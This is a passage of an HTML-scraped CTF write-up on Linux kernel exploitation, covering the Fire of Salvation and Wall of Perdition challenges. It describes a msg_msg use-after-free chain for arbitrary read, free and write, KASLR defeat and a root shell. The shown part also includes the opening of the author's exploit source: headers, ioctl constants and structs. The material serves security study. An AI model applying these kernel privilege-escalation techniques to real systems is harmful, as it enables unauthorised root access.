        <a href="https://gist.github.com/BitsByWill/cf23c13d4a1d345b557a157740e191fe/raw/22c9c8f0ec44a889d72d7a62674449085cfacdf6/fire_exploit.c" style="float:right">view raw</a>
        <a href="https://gist.github.com/BitsByWill/cf23c13d4a1d345b557a157740e191fe#file-fire_exploit-c">
          fire_exploit.c
        </a>
        hosted with ❤ by <a href="https://github.com/">GitHub</a>
      </div>
    </div>
</div>
</div><div><br></div><div>With this exploit, you can reliably pop a root shell and allow us to read the flag:</div><div class="separator" style="clear: both; text-align: center;"><a href="https://1.bp.blogspot.com/-Nrflk6NKTas/YSh7G7e2rcI/AAAAAAAACIs/OJ9-4KKtQToyh-6_LlU84vcNDWiHy-JbwCLcBGAsYHQ/s730/easy_mode.gif" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="476" data-original-width="730" height="418" src="./2021 - Utilizing msg_msg Objects for Arbitrary Read and Arbitrary Write in the Linux Kernel part 2_files/easy_mode.gif" width="640"></a></div><div><br></div><div>For some reason, musl wasn't working well with threads on the qemu, so I had to use gcc static. Luckily, upx packer managed to cut the size down by more than 60%, though that is still much larger than a musl compiled exploit. Congratulations to <a href="https://github.com/MaherAzzouzi">Maher</a> for taking the unofficial post-CTF first blood on this challenge. A shout-out goes to team SuperGuesser as well, I heard they were quite close to solving during the CTF as well.<br><br>As for the Wall of Perdition challenge, I will only provide a brief summary of my solution, which I believe might slightly differ from D3v17's. His post on this part will be much more detailed, with many more diagrams to come. <br><br>In this second part, the sizes are limited to kmalloc-64; I wasn't aware of any commonly known abusable structures in this range. While arb read is still quite trivial thanks to MSG_COPY, using it to get a kernel base leak with FG-KASLR is not as easy. Arb write becomes even harder as well.&nbsp;</div><div><br></div><div>To get the same shm_file_data kernel leak, I first allocated two message queues, and I would like to find the address of one of them (I will call this one front queue). Finding its address is easy, as we can just spray msg_msg structs in the same queue (beware that there is a limit set by /proc/sys/kernel/msgmnb that defaults to 16384 bytes total per queue), and abuse OOB read via MSG_COPY to check for known msg_msg contents from the spray.&nbsp;</div><div><br></div><div>This leak will be useful to avoid crashes and prematurely stop the traversal in the msg_msg queue linked list during do_msgrcv when MSG_COPY isn't set. Then I sprayed more msg_queue allocations, and sent in a message for each, as I am trying to look for a message and queue I can reach with the OOB read from the front queue in kmalloc 64 slabs. From here, I can send in a msg_msg object that chains a 4k chunk with a kmalloc 32 chunk into this target queue, and leak its address based on OOB reading the linked list structures of its previous kmalloc 64 msg_msg object.&nbsp;</div><div><br></div><div>At this point, we have to pray that the qword before that 4k chunk is null. If so, replacing the next pointer of the UAF'd chunk in the front queue to that location will allow us to get the address of the kmalloc 32 chunk. After spraying many more shm_file_data objects, we can just expand the  msg_msg struct under our UAF's control to a much larger size, replace this very object's next pointer to the address of the kmalloc 32 chunk, and just dump huge portions of the kmalloc 32 with MSG_COPY for a kernel base leak. From here on out, arb reading the task struct to find the current struct is pretty much the same as in the previous exploit.<br><br>Now, for arb write, I reused the target queue earlier, cleared the large msg out from it, and replaced it with a msg_msg object that has two 4k chunks in its chain (this is getting quite close to the default msg_msg size limit). I can abuse the previous technique to then leak the address of this new 4k msg_msg object along with the address of its msg segment. Then, I freed this large object with msgrcv (and we will get them back in the order of leaked segment address and then the leaked msg_msg object due to LIFO). I msgsnd again a size of a message that requires two 4k chunks, and hang it with userfaultfd on load_msg, and quickly arb free its segment via the msg_msg under UAF control in the front queue via msgrcv. No crashes will occur since I fixed its pointers to go right back to the front queue itself.<br><br>Upon this arb free primitive, I send another message in another message queue that was previously allocated; it will also be hanged when reading in userland data. The object will just be of enough size to cover a 4k chunk (to get back the last freed chunk due to LIFO) chained with a small segment linked along. I let the data transfer from the original hang to continue, which gives me the ability to overwrite the next pointer of the currently allocated msg_msg object, thereby giving me arb write once I let this second hang continue and finish off. This might seem quite insane, but I promise you that <a href="https://syst3mfailure.io/wall-of-perdition" target="_blank">D3v17's blogpost</a> will make this quite clear with his diagrams.<br><br>Here is my final exploit, which only had about a 50% success rate.</div><div><br></div><div><script src="./2021 - Utilizing msg_msg Objects for Arbitrary Read and Arbitrary Write in the Linux Kernel part 2_files/cf23c13d4a1d345b557a157740e191fe.js(9).下載"></script><link rel="stylesheet" href="./2021 - Utilizing msg_msg Objects for Arbitrary Read and Arbitrary Write in the Linux Kernel part 2_files/gist-embed-ff75a167df5efbfedb0e388793ca9fe7.css"><div id="gist111465757" class="gist">
    <div class="gist-file" translate="no">
      <div class="gist-data">
        <div class="js-gist-file-update-container js-task-list-container file-box">
  <div id="file-wall_exploit-c" class="file my-2">
    
  <div itemprop="text" class="Box-body p-0 blob-wrapper data type-c  ">

      
<div class="js-check-bidi blob-code-content">
  <template class="js-file-alert-template"></template>
<template class="js-line-alert-template"></template>

  <table class="highlight tab-size js-file-line-container js-code-nav-container js-tagsearch-file" data-tab-size="8" data-paste-markdown-skip="" data-tagsearch-lang="C" data-tagsearch-path="wall_exploit.c">
        <tbody><tr>
          <td id="file-wall_exploit-c-L1" class="blob-num js-line-number js-code-nav-line-number" data-line-number="1"></td>
          <td id="file-wall_exploit-c-LC1" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">define</span> <span class="pl-en">_GNU_SOURCE</span></td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L2" class="blob-num js-line-number js-code-nav-line-number" data-line-number="2"></td>
          <td id="file-wall_exploit-c-LC2" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">include</span> <span class="pl-s"><span class="pl-pds">&lt;</span>stdio.h<span class="pl-pds">&gt;</span></span></td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L3" class="blob-num js-line-number js-code-nav-line-number" data-line-number="3"></td>
          <td id="file-wall_exploit-c-LC3" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">include</span> <span class="pl-s"><span class="pl-pds">&lt;</span>string.h<span class="pl-pds">&gt;</span></span></td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L4" class="blob-num js-line-number js-code-nav-line-number" data-line-number="4"></td>
          <td id="file-wall_exploit-c-LC4" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">include</span> <span class="pl-s"><span class="pl-pds">&lt;</span>unistd.h<span class="pl-pds">&gt;</span></span></td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L5" class="blob-num js-line-number js-code-nav-line-number" data-line-number="5"></td>
          <td id="file-wall_exploit-c-LC5" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">include</span> <span class="pl-s"><span class="pl-pds">&lt;</span>stdlib.h<span class="pl-pds">&gt;</span></span></td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L6" class="blob-num js-line-number js-code-nav-line-number" data-line-number="6"></td>
          <td id="file-wall_exploit-c-LC6" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">include</span> <span class="pl-s"><span class="pl-pds">&lt;</span>stdint.h<span class="pl-pds">&gt;</span></span></td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L7" class="blob-num js-line-number js-code-nav-line-number" data-line-number="7"></td>
          <td id="file-wall_exploit-c-LC7" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">include</span> <span class="pl-s"><span class="pl-pds">&lt;</span>fcntl.h<span class="pl-pds">&gt;</span></span></td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L8" class="blob-num js-line-number js-code-nav-line-number" data-line-number="8"></td>
          <td id="file-wall_exploit-c-LC8" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">include</span> <span class="pl-s"><span class="pl-pds">&lt;</span>sched.h<span class="pl-pds">&gt;</span></span></td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L9" class="blob-num js-line-number js-code-nav-line-number" data-line-number="9"></td>
          <td id="file-wall_exploit-c-LC9" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">include</span> <span class="pl-s"><span class="pl-pds">&lt;</span>pthread.h<span class="pl-pds">&gt;</span></span></td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L10" class="blob-num js-line-number js-code-nav-line-number" data-line-number="10"></td>
          <td id="file-wall_exploit-c-LC10" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">include</span> <span class="pl-s"><span class="pl-pds">&lt;</span>byteswap.h<span class="pl-pds">&gt;</span></span></td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L11" class="blob-num js-line-number js-code-nav-line-number" data-line-number="11"></td>
          <td id="file-wall_exploit-c-LC11" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">include</span> <span class="pl-s"><span class="pl-pds">&lt;</span>poll.h<span class="pl-pds">&gt;</span></span></td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L12" class="blob-num js-line-number js-code-nav-line-number" data-line-number="12"></td>
          <td id="file-wall_exploit-c-LC12" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">include</span> <span class="pl-s"><span class="pl-pds">&lt;</span>assert.h<span class="pl-pds">&gt;</span></span></td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L13" class="blob-num js-line-number js-code-nav-line-number" data-line-number="13"></td>
          <td id="file-wall_exploit-c-LC13" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">include</span> <span class="pl-s"><span class="pl-pds">&lt;</span>time.h<span class="pl-pds">&gt;</span></span></td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L14" class="blob-num js-line-number js-code-nav-line-number" data-line-number="14"></td>
          <td id="file-wall_exploit-c-LC14" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">include</span> <span class="pl-s"><span class="pl-pds">&lt;</span>signal.h<span class="pl-pds">&gt;</span></span></td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L15" class="blob-num js-line-number js-code-nav-line-number" data-line-number="15"></td>
          <td id="file-wall_exploit-c-LC15" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">include</span> <span class="pl-s"><span class="pl-pds">&lt;</span>sys/wait.h<span class="pl-pds">&gt;</span></span></td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L16" class="blob-num js-line-number js-code-nav-line-number" data-line-number="16"></td>
          <td id="file-wall_exploit-c-LC16" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">include</span> <span class="pl-s"><span class="pl-pds">&lt;</span>sys/syscall.h<span class="pl-pds">&gt;</span></span></td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L17" class="blob-num js-line-number js-code-nav-line-number" data-line-number="17"></td>
          <td id="file-wall_exploit-c-LC17" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">include</span> <span class="pl-s"><span class="pl-pds">&lt;</span>sys/mman.h<span class="pl-pds">&gt;</span></span></td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L18" class="blob-num js-line-number js-code-nav-line-number" data-line-number="18"></td>
          <td id="file-wall_exploit-c-LC18" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">include</span> <span class="pl-s"><span class="pl-pds">&lt;</span>sys/timerfd.h<span class="pl-pds">&gt;</span></span></td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L19" class="blob-num js-line-number js-code-nav-line-number" data-line-number="19"></td>
          <td id="file-wall_exploit-c-LC19" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">include</span> <span class="pl-s"><span class="pl-pds">&lt;</span>sys/ipc.h<span class="pl-pds">&gt;</span></span></td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L20" class="blob-num js-line-number js-code-nav-line-number" data-line-number="20"></td>
          <td id="file-wall_exploit-c-LC20" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">include</span> <span class="pl-s"><span class="pl-pds">&lt;</span>sys/msg.h<span class="pl-pds">&gt;</span></span></td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L21" class="blob-num js-line-number js-code-nav-line-number" data-line-number="21"></td>
          <td id="file-wall_exploit-c-LC21" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">include</span> <span class="pl-s"><span class="pl-pds">&lt;</span>sys/socket.h<span class="pl-pds">&gt;</span></span></td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L22" class="blob-num js-line-number js-code-nav-line-number" data-line-number="22"></td>
          <td id="file-wall_exploit-c-LC22" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">include</span> <span class="pl-s"><span class="pl-pds">&lt;</span>sys/reboot.h<span class="pl-pds">&gt;</span></span></td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L23" class="blob-num js-line-number js-code-nav-line-number" data-line-number="23"></td>
          <td id="file-wall_exploit-c-LC23" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">include</span> <span class="pl-s"><span class="pl-pds">&lt;</span>linux/userfaultfd.h<span class="pl-pds">&gt;</span></span></td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L24" class="blob-num js-line-number js-code-nav-line-number" data-line-number="24"></td>
          <td id="file-wall_exploit-c-LC24" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">include</span> <span class="pl-s"><span class="pl-pds">&lt;</span>arpa/inet.h<span class="pl-pds">&gt;</span></span></td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L25" class="blob-num js-line-number js-code-nav-line-number" data-line-number="25"></td>
          <td id="file-wall_exploit-c-LC25" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">include</span> <span class="pl-s"><span class="pl-pds">&lt;</span>sys/shm.h<span class="pl-pds">&gt;</span></span></td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L26" class="blob-num js-line-number js-code-nav-line-number" data-line-number="26"></td>
          <td id="file-wall_exploit-c-LC26" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L27" class="blob-num js-line-number js-code-nav-line-number" data-line-number="27"></td>
          <td id="file-wall_exploit-c-LC27" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">define</span> <span class="pl-en">UFFDIO_API</span> <span class="pl-c1">0xc018aa3f</span></td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L28" class="blob-num js-line-number js-code-nav-line-number" data-line-number="28"></td>
          <td id="file-wall_exploit-c-LC28" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">define</span> <span class="pl-en">UFFDIO_REGISTER</span> <span class="pl-c1">0xc020aa00</span></td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L29" class="blob-num js-line-number js-code-nav-line-number" data-line-number="29"></td>
          <td id="file-wall_exploit-c-LC29" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">define</span> <span class="pl-en">UFFDIO_UNREGISTER</span> <span class="pl-c1">0x8010aa01</span></td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L30" class="blob-num js-line-number js-code-nav-line-number" data-line-number="30"></td>
          <td id="file-wall_exploit-c-LC30" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">define</span> <span class="pl-en">UFFDIO_COPY</span> <span class="pl-c1">0xc028aa03</span></td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L31" class="blob-num js-line-number js-code-nav-line-number" data-line-number="31"></td>
          <td id="file-wall_exploit-c-LC31" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">define</span> <span class="pl-en">UFFDIO_ZEROPAGE</span> <span class="pl-c1">0xc020aa04</span></td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L32" class="blob-num js-line-number js-code-nav-line-number" data-line-number="32"></td>
          <td id="file-wall_exploit-c-LC32" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">define</span> <span class="pl-en">UFFDIO_WAKE</span> <span class="pl-c1">0x8010aa02</span></td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L33" class="blob-num js-line-number js-code-nav-line-number" data-line-number="33"></td>
          <td id="file-wall_exploit-c-LC33" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L34" class="blob-num js-line-number js-code-nav-line-number" data-line-number="34"></td>
          <td id="file-wall_exploit-c-LC34" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">define</span> <span class="pl-en">ADD_RULE</span> <span class="pl-c1">0x1337babe</span></td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L35" class="blob-num js-line-number js-code-nav-line-number" data-line-number="35"></td>
          <td id="file-wall_exploit-c-LC35" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">define</span> <span class="pl-en">DELETE_RULE</span> <span class="pl-c1">0xdeadbabe</span></td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L36" class="blob-num js-line-number js-code-nav-line-number" data-line-number="36"></td>
          <td id="file-wall_exploit-c-LC36" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">define</span> <span class="pl-en">EDIT_RULE</span> <span class="pl-c1">0x1337beef</span></td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L37" class="blob-num js-line-number js-code-nav-line-number" data-line-number="37"></td>
          <td id="file-wall_exploit-c-LC37" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">define</span> <span class="pl-en">SHOW_RULE</span> <span class="pl-c1">0xdeadbeef</span></td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L38" class="blob-num js-line-number js-code-nav-line-number" data-line-number="38"></td>
          <td id="file-wall_exploit-c-LC38" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">define</span> <span class="pl-en">DUP_RULE</span> <span class="pl-c1">0xbaad5aad</span></td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L39" class="blob-num js-line-number js-code-nav-line-number" data-line-number="39"></td>
          <td id="file-wall_exploit-c-LC39" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L40" class="blob-num js-line-number js-code-nav-line-number" data-line-number="40"></td>
          <td id="file-wall_exploit-c-LC40" class="blob-code blob-code-inner js-file-line"><span class="pl-k">typedef</span> <span class="pl-k">struct</span></td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L41" class="blob-num js-line-number js-code-nav-line-number" data-line-number="41"></td>
          <td id="file-wall_exploit-c-LC41" class="blob-code blob-code-inner js-file-line">{</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L42" class="blob-num js-line-number js-code-nav-line-number" data-line-number="42"></td>
          <td id="file-wall_exploit-c-LC42" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">long</span> mtype;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L43" class="blob-num js-line-number js-code-nav-line-number" data-line-number="43"></td>
          <td id="file-wall_exploit-c-LC43" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">char</span> mtext[<span class="pl-c1">1</span>];</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L44" class="blob-num js-line-number js-code-nav-line-number" data-line-number="44"></td>
          <td id="file-wall_exploit-c-LC44" class="blob-code blob-code-inner js-file-line">}msg;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L45" class="blob-num js-line-number js-code-nav-line-number" data-line-number="45"></td>
          <td id="file-wall_exploit-c-LC45" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L46" class="blob-num js-line-number js-code-nav-line-number" data-line-number="46"></td>
          <td id="file-wall_exploit-c-LC46" class="blob-code blob-code-inner js-file-line"><span class="pl-k">typedef</span> <span class="pl-k">struct</span> </td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L47" class="blob-num js-line-number js-code-nav-line-number" data-line-number="47"></td>
          <td id="file-wall_exploit-c-LC47" class="blob-code blob-code-inner js-file-line">{</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L48" class="blob-num js-line-number js-code-nav-line-number" data-line-number="48"></td>
          <td id="file-wall_exploit-c-LC48" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">void</span> *ll_next;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L49" class="blob-num js-line-number js-code-nav-line-number" data-line-number="49"></td>
          <td id="file-wall_exploit-c-LC49" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">void</span> *ll_prev;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L50" class="blob-num js-line-number js-code-nav-line-number" data-line-number="50"></td>
          <td id="file-wall_exploit-c-LC50" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">long</span> m_type;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L51" class="blob-num js-line-number js-code-nav-line-number" data-line-number="51"></td>
          <td id="file-wall_exploit-c-LC51" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">size_t</span> m_ts;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L52" class="blob-num js-line-number js-code-nav-line-number" data-line-number="52"></td>
          <td id="file-wall_exploit-c-LC52" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">void</span> *next;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L53" class="blob-num js-line-number js-code-nav-line-number" data-line-number="53"></td>
          <td id="file-wall_exploit-c-LC53" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">void</span> *security;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L54" class="blob-num js-line-number js-code-nav-line-number" data-line-number="54"></td>
          <td id="file-wall_exploit-c-LC54" class="blob-code blob-code-inner js-file-line">}msg_header;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L55" class="blob-num js-line-number js-code-nav-line-number" data-line-number="55"></td>
          <td id="file-wall_exploit-c-LC55" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L56" class="blob-num js-line-number js-code-nav-line-number" data-line-number="56"></td>
          <td id="file-wall_exploit-c-LC56" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">define</span> <span class="pl-en">INBOUND</span> <span class="pl-c1">0</span></td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L57" class="blob-num js-line-number js-code-nav-line-number" data-line-number="57"></td>
          <td id="file-wall_exploit-c-LC57" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">define</span> <span class="pl-en">OUTBOUND</span> <span class="pl-c1">1</span></td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L58" class="blob-num js-line-number js-code-nav-line-number" data-line-number="58"></td>
          <td id="file-wall_exploit-c-LC58" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L59" class="blob-num js-line-number js-code-nav-line-number" data-line-number="59"></td>
          <td id="file-wall_exploit-c-LC59" class="blob-code blob-code-inner js-file-line"><span class="pl-k">typedef</span> <span class="pl-k">struct</span></td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L60" class="blob-num js-line-number js-code-nav-line-number" data-line-number="60"></td>
          <td id="file-wall_exploit-c-LC60" class="blob-code blob-code-inner js-file-line">{</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L61" class="blob-num js-line-number js-code-nav-line-number" data-line-number="61"></td>
          <td id="file-wall_exploit-c-LC61" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">char</span> iface[<span class="pl-c1">16</span>];</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L62" class="blob-num js-line-number js-code-nav-line-number" data-line-number="62"></td>
          <td id="file-wall_exploit-c-LC62" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">char</span> name[<span class="pl-c1">16</span>];</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L63" class="blob-num js-line-number js-code-nav-line-number" data-line-number="63"></td>
          <td id="file-wall_exploit-c-LC63" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">char</span> ip[<span class="pl-c1">16</span>];</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L64" class="blob-num js-line-number js-code-nav-line-number" data-line-number="64"></td>
          <td id="file-wall_exploit-c-LC64" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">char</span> netmask[<span class="pl-c1">16</span>];</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L65" class="blob-num js-line-number js-code-nav-line-number" data-line-number="65"></td>
          <td id="file-wall_exploit-c-LC65" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">uint8_t</span> idx;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L66" class="blob-num js-line-number js-code-nav-line-number" data-line-number="66"></td>
          <td id="file-wall_exploit-c-LC66" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">uint8_t</span> type;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L67" class="blob-num js-line-number js-code-nav-line-number" data-line-number="67"></td>
          <td id="file-wall_exploit-c-LC67" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">uint16_t</span> proto;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L68" class="blob-num js-line-number js-code-nav-line-number" data-line-number="68"></td>
          <td id="file-wall_exploit-c-LC68" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">uint16_t</span> port;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L69" class="blob-num js-line-number js-code-nav-line-number" data-line-number="69"></td>
          <td id="file-wall_exploit-c-LC69" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">uint8_t</span> action;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L70" class="blob-num js-line-number js-code-nav-line-number" data-line-number="70"></td>
          <td id="file-wall_exploit-c-LC70" class="blob-code blob-code-inner js-file-line">} <span class="pl-c1">user_rule_t</span>;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L71" class="blob-num js-line-number js-code-nav-line-number" data-line-number="71"></td>
          <td id="file-wall_exploit-c-LC71" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L72" class="blob-num js-line-number js-code-nav-line-number" data-line-number="72"></td>
          <td id="file-wall_exploit-c-LC72" class="blob-code blob-code-inner js-file-line"><span class="pl-k">int</span> fd, front_qid, target_qid, final_qid;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L73" class="blob-num js-line-number js-code-nav-line-number" data-line-number="73"></td>
          <td id="file-wall_exploit-c-LC73" class="blob-code blob-code-inner js-file-line"><span class="pl-k">int</span> hit = <span class="pl-c1">0</span>;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L74" class="blob-num js-line-number js-code-nav-line-number" data-line-number="74"></td>
          <td id="file-wall_exploit-c-LC74" class="blob-code blob-code-inner js-file-line"><span class="pl-c1">uint32_t</span> target_msg_idx;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L75" class="blob-num js-line-number js-code-nav-line-number" data-line-number="75"></td>
          <td id="file-wall_exploit-c-LC75" class="blob-code blob-code-inner js-file-line"><span class="pl-c1">uint64_t</span> target_addr;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L76" class="blob-num js-line-number js-code-nav-line-number" data-line-number="76"></td>
          <td id="file-wall_exploit-c-LC76" class="blob-code blob-code-inner js-file-line"><span class="pl-c1">pthread_t</span> thread1, thread2, thread3;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L77" class="blob-num js-line-number js-code-nav-line-number" data-line-number="77"></td>
          <td id="file-wall_exploit-c-LC77" class="blob-code blob-code-inner js-file-line"><span class="pl-c1">uint64_t</span> race_page1, race_page2;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L78" class="blob-num js-line-number js-code-nav-line-number" data-line-number="78"></td>
          <td id="file-wall_exploit-c-LC78" class="blob-code blob-code-inner js-file-line"><span class="pl-c1">int8_t</span> marker = <span class="pl-c1">0</span>; <span class="pl-c"><span class="pl-c">//</span> for thread sync</span></td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L79" class="blob-num js-line-number js-code-nav-line-number" data-line-number="79"></td>
          <td id="file-wall_exploit-c-LC79" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L80" class="blob-num js-line-number js-code-nav-line-number" data-line-number="80"></td>
          <td id="file-wall_exploit-c-LC80" class="blob-code blob-code-inner js-file-line"><span class="pl-c1">uint64_t</span> init_ipc_ns, kbase, init_task, init_cred;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L81" class="blob-num js-line-number js-code-nav-line-number" data-line-number="81"></td>
          <td id="file-wall_exploit-c-LC81" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L82" class="blob-num js-line-number js-code-nav-line-number" data-line-number="82"></td>
          <td id="file-wall_exploit-c-LC82" class="blob-code blob-code-inner js-file-line"><span class="pl-k">void</span> <span class="pl-en">hexprint</span>(<span class="pl-k">char</span> *buffer, <span class="pl-k">unsigned</span> <span class="pl-k">int</span> bytes)</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L83" class="blob-num js-line-number js-code-nav-line-number" data-line-number="83"></td>
          <td id="file-wall_exploit-c-LC83" class="blob-code blob-code-inner js-file-line">{</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L84" class="blob-num js-line-number js-code-nav-line-number" data-line-number="84"></td>
          <td id="file-wall_exploit-c-LC84" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">int</span> dqwords = ((bytes + <span class="pl-c1">0x10</span> - <span class="pl-c1">1</span>)&amp;<span class="pl-c1">0xfffffff0</span>) / <span class="pl-c1">0x10</span>;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L85" class="blob-num js-line-number js-code-nav-line-number" data-line-number="85"></td>
          <td id="file-wall_exploit-c-LC85" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">int</span> qwords = dqwords * <span class="pl-c1">2</span>;</td>
        </tr>
        <tr>
